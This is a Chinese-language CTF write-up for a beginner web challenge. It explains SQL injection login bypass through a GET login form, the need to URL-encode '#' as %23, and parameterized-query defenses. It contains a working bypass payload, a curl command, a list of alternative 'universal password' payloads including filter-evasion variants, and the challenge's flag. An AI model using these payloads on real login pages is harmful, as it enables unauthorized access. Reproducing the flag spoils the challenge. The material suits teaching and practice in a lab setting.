SQL 注入登录绕过题解

langkong10132026-10-202026-10-28

零基础详解版 —— 从登录框讲到「万能密码」，附 %23 编码坑

题目：Syclover @ cl4y 登录框　|　flag：CTF2{f9305d42-253d-4be2-91fc-8a1de7696305}

一、题目信息

项目 内容
题目地址 http://154eb5465a14fddbc7f9c5b6.http-ctf2.dasctf.com/
方向 Web
考点 SQL 注入（登录绕过 / 万能密码）
页面特征 用户名 + 密码登录框，提交到 check.php，GET 方式
关键 payload username=admin’ or 1=1%23&password=1
最终 flag CTF2{f9305d42-253d-4be2-91fc-8a1de7696305}
一句话思路 在用户名里塞入 ‘ or 1=1#，把后面的密码判断注释掉，让 SQL 条件恒为真，直接登录成功。

二、第一步：看清登录框怎么提交

打开首页，是一个登录页面（作者署名 Syclover @ cl4y）。按 Ctrl+U 看表单源码：

三个关键信息：

属性 值 含义
action check.php 表单提交到 check.php 处理
method GET 参数拼在 URL 后面，形如 ?username=xx&password=xx
name username / password 后端接收参数的名字

也就是说，你登录时实际发出的请求是：

GET /check.php?username=你输入的&password=你输入的 HTTP/1.1

结论：只要我直接构造这个 URL，就能绕过页面手动输入。

2.1 先正常登录一次

随便输入 admin / 123456，页面返回：

NO,Wrong username password！！！

说明后端会拿你输入的值去数据库里比对。

三、第二步：判断能不能注入

思路：如果后端是把输入直接拼进 SQL 语句，那我在用户名里加一个单引号，SQL 就会”断裂”，页面行为会变。

测试 1：正常输入

?username=admin&password=1 → NO,Wrong username password！！！

测试 2：加单引号

?username=admin’&password=1 → 页面行为异常/报错

测试 3：闭合单引号 + 恒真条件

?username=admin’ or 1=1%23&password=1 → Login Success！

看到 Login Success，就说明：存在 SQL 注入，而且可以用万能密码绕过。

四、第三步：拿到 flag 的完整 URL

在浏览器地址栏直接访问（注意 %23）：

http://154eb5465a14fddbc7f9c5b6.http-ctf2.dasctf.com/check.php
?username=admin’%20or%201=1%23&password=1

或者一行写完整：

http://154eb5465a14fddbc7f9c5b6.http-ctf2.dasctf.com/check.php?username=admin'%20or%201=1%23&password=1

页面返回：

Login Success!
flag：
CTF2{f9305d42-253d-4be2-91fc-8a1de7696305}

复制 CTF2{…} 这一整串提交即可。

五、原理：这段 payload 到底做了什么

5.1 后端大概是这样写的

这类题的标准写法（PHP + MySQL）：

$username = $_GET[“username”];
$password = $_GET[“password”];

$sql = “SELECT * FROM users WHERE username=’$username’ AND password=’$password’”;
$result = mysqli_query($conn, $sql);

if (mysqli_num_rows($result) > 0) {
echo “Login Success!”;
// 输出 flag
} else {
echo “NO,Wrong username password！！！”;
}

关键问题：$username 和 $password 被直接拼进了 SQL 字符串，没有做任何过滤。

5.2 正常输入时

username = admin
password = 1

SELECT * FROM users WHERE username=’admin’ AND password=’1’

数据库里如果没有 admin/1 这条记录，返回 0 行 → 登录失败。

5.3 注入后

username = admin’ or 1=1#
password = 1

SELECT * FROM users WHERE username=’admin’ or 1=1#’ AND password=’1’

逐段拆解：

片段 作用
admin’ 先闭合 username 的单引号，让 admin 变成一个合法字符串
or 1=1 加一个恒真条件：1=1 永远成立
# 注释符，把后面剩下的 ‘ AND password=’1’ 全部注释掉

最终 SQL 变成：

SELECT * FROM users WHERE username=’admin’ or 1=1

条件恒为真 → 返回表里的记录 → num_rows > 0 → 登录成功。

因为 # 把密码判断整段注释掉了，所以密码填什么都能进，这就是「万能密码」。

六、最容易踩的坑：# 必须写成 %23

这是本题 90% 新手卡住的地方。

6.1 为什么不能用

在 URL 里，# 有特殊含义：它表示”锚点/片段”，浏览器会把 # 以及它后面的内容留在本地，根本不会发给服务器。

所以如果你在地址栏写：

?username=admin’ or 1=1#&password=1

服务器实际收到的是：

?username=admin’ or 1=1

后面的 &password=1 被浏览器当成锚点吃掉了，SQL 也没被注释，自然失败。

6.2 正确写法：URL 编码

字符 编码 说明
# %23 注释符，必须编码
空格 %20 或者用 +
‘ %27 单引号，浏览器一般会自动编码，手写也行

所以正确 URL 是：

?username=admin’%20or%201=1%23&password=1

记忆口诀：井号变 %23，空格变 %20。

6.3 用 Burp / curl 就不用管编码

如果用 Burp 的 Repeater 或 curl 的 –data-urlencode，工具会帮你编码，直接写 # 和空格即可。

curl -s -G “http://题目地址/check.php”
–data-urlencode “username=admin’ or 1=1#”
–data-urlencode “password=1”

  • curl —— 发请求
  • -G —— 把 –data-urlencode 的内容拼到 URL 上，变成 GET 参数
  • –data-urlencode —— 自动做 URL 编码（# 会变成 %23，空格变 +）
  • \ —— 命令太长时换行

七、同类 payload 一览（换着试）

payload（username 字段） 说明
admin’ or 1=1# 本题可用，最常用
admin’ or 1=1 – - 用 – 加空格注释（MySQL 要求 – 后跟空格）
‘ or 1=1# 不需要知道用户名
admin’# 直接注释掉密码判断，若存在 admin 用户即可登录
‘ or ‘1’=’1’# 字符串形式恒真
admin’ or ‘a’=’a’# 同上，换种写法
admin’//or//1=1# 用注释代替空格，绕空格过滤

注意：不同题的后端写法不同，payload 要试。先用 admin’ or 1=1#，不行再换。

八、为什么有些 payload 不成功

例如 “1’ or ‘1’=’1” 这道题没成功，常见原因有三个：

  1. 没有注释掉后面：' AND password='1' 还留在语句里，可能改变逻辑或造成语法错误。
  2. 后端除了查行数，还比较了返回记录的密码：注入查出来的第一条是 admin，密码对不上就失败。
  3. 后端做了部分过滤（比如过滤空格、过滤 or），需要换编码或换写法。

结论：能用 # 注释掉后面，就尽量注释掉，这是最稳的思路。

九、这道题在教我们什么（防御视角）

错误做法 正确做法
把用户输入直接拼进 SQL 使用预编译 / 参数化查询（PDO、mysqli prepare）
只在前端做校验 后端必须校验，前端校验可被绕过
用黑名单过滤关键字 黑名单永远不全，应做类型校验 + 参数化
把报错直接显示给用户 关闭详细报错，避免泄露数据库结构

参数化查询的核心：SQL 语句的结构先固定，用户输入只作为”值”传入，永远不会被当成 SQL 代码执行。

$stmt = $conn->prepare(“SELECT * FROM users WHERE username=? AND password=?”);
$stmt->bind_param(“ss”, $username, $password);
$stmt->execute();

  • prepare —— 先把 SQL 模板发给数据库，结构固定
  • ? —— 占位符，代表”这里将来填一个值”
  • bind_param —— 把用户输入绑定到占位符上，只当值处理

这样即使输入 admin' or 1=1#，也只会被当成一串普通文字去匹配，不会变成 SQL 语法。

十、易错点清单

坑 现象 解决
# 没编码 登录失败，SQL 没被注释 写成 %23
空格没编码 URL 被截断或参数错位 写成 %20 或 +
用了中文引号 语法不生效 必须用英文单引号 ‘
表单是 GET，却往 POST body 里塞 参数收不到 用 URL 参数传
payload 少写 or 条件不成立 检查是否 admin’ or 1=1#
容器过期 页面打不开 回平台重新开环境
flag 格式 提交失败 本题是 CTF2{…}

十一、复盘模板

题目：SQL 注入登录绕过（cl4y 登录框）
平台 / 地址：CTF² 容器
考点：SQL 注入、万能密码、URL 编码
页面现象：用户名 + 密码登录框，错误提示 NO,Wrong username password
我的思路：先看表单 method/action → 试单引号 → 试 or 1=1# → 成功
卡在哪：一开始 # 没编码，浏览器把它当锚点
正确做法：?username=admin’%20or%201=1%23&password=1
为什么有效：闭合引号 + 恒真条件 + 注释掉密码判断
同类题规律：登录框先试万能密码；不行再看报错/盲注

十二、自测三问

  • 为什么 payload 里要先写一个单引号？
  • 为什么 # 必须写成 %23？
  • 为什么参数化查询能防住这个漏洞？

三个都能答出来，这道题就真懂了。
